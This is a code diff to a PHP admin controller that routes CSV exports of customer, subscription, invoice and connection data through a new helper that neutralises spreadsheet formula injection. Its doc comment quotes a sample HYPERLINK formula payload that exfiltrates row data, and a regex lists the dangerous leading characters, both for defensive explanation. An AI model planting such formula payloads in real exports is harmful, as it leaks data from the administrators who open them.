@@ -78,7 +78,7 @@ class AdminReportController extends Controller
 
     private function customers($out): void
     {
-        fputcsv($out, [
+        self::row($out, [
             'tenant_id', 'owner', 'email', 'whatsapp', 'signed_up',
             'plan', 'subscription_status', 'users', 'connections',
             'contacts', 'conversations', 'lifetime_paid_brl',
@@ -98,7 +98,7 @@ class AdminReportController extends Controller
                     ->pluck('total', 'tenant_id');
 
                 foreach ($tenants as $tenant) {
-                    fputcsv($out, [
+                    self::row($out, [
                         $tenant->id,
                         $tenant->user?->name,
                         $tenant->user?->email,
@@ -120,7 +120,7 @@ class AdminReportController extends Controller
 
     private function subscriptions($out): void
     {
-        fputcsv($out, [
+        self::row($out, [
             'id', 'tenant_id', 'owner', 'email', 'plan', 'status',
             'price_brl', 'billing_cycle', 'period_start', 'period_end',
             'trial_ends_at', 'created_at',
@@ -131,7 +131,7 @@ class AdminReportController extends Controller
             ->orderBy('id')
             ->chunk(200, function ($subscriptions) use ($out) {
                 foreach ($subscriptions as $s) {
-                    fputcsv($out, [
+                    self::row($out, [
                         $s->id,
                         $s->tenant_id,
                         $s->tenant?->user?->name,
@@ -153,7 +153,7 @@ class AdminReportController extends Controller
 
     private function invoices($out, AdminPeriod $period): void
     {
-        fputcsv($out, [
+        self::row($out, [
             'id', 'tenant_id', 'owner', 'email', 'status', 'method',
             'amount_brl', 'currency', 'purpose', 'due_at', 'paid_at', 'created_at',
         ]);
@@ -164,7 +164,7 @@ class AdminReportController extends Controller
             ->orderBy('id')
             ->chunk(500, function ($invoices) use ($out) {
                 foreach ($invoices as $i) {
-                    fputcsv($out, [
+                    self::row($out, [
                         $i->id,
                         $i->tenant_id,
                         $i->tenant?->user?->name,
@@ -184,7 +184,7 @@ class AdminReportController extends Controller
 
     private function connections($out): void
     {
-        fputcsv($out, [
+        self::row($out, [
             'id', 'tenant_id', 'owner', 'name', 'channel', 'status',
             'created_at', 'last_synced_at',
         ]);
@@ -194,7 +194,7 @@ class AdminReportController extends Controller
             ->orderBy('id')
             ->chunk(500, function ($connections) use ($out) {
                 foreach ($connections as $c) {
-                    fputcsv($out, [
+                    self::row($out, [
                         $c->id,
                         $c->tenant_id,
                         $c->tenant?->user?->name,
@@ -207,4 +207,32 @@ class AdminReportController extends Controller
                 }
             });
     }
+
+    /**
+     * One CSV row, with spreadsheet formulas defused.
+     *
+     * ⚠️ Every name and e-mail in these exports was typed by a customer, and
+     * registration is open. A cell beginning `=`, `+`, `-` or `@` is a formula
+     * to Excel, Google Sheets and LibreOffice — `=HYPERLINK("https://…"&A1,"x")`
+     * exfiltrates the row it sits in, and on some Excel configurations the
+     * payload runs. The person opening the file is a platform admin, so the
+     * blast radius is the most privileged workstation there is.
+     *
+     * Prefixed with a tab rather than a quote: a leading `'` is swallowed by
+     * Excel and shows up as part of the value in every other reader, while a
+     * tab keeps the cell readable and stops it being parsed as a formula.
+     */
+    private static function row($out, array $cells): void
+    {
+        fputcsv($out, array_map(static function ($cell) {
+            if (! is_string($cell) || $cell === '') {
+                return $cell;
+            }
+
+            // Carriage returns and tabs lead the same way: they are how a
+            // payload hides from somebody eyeballing the file.
+            return preg_match('/^[=+\-@\t\r]/', $cell) === 1 ? "\t".$cell : $cell;
+        }, $cells));
+    }
+
 }
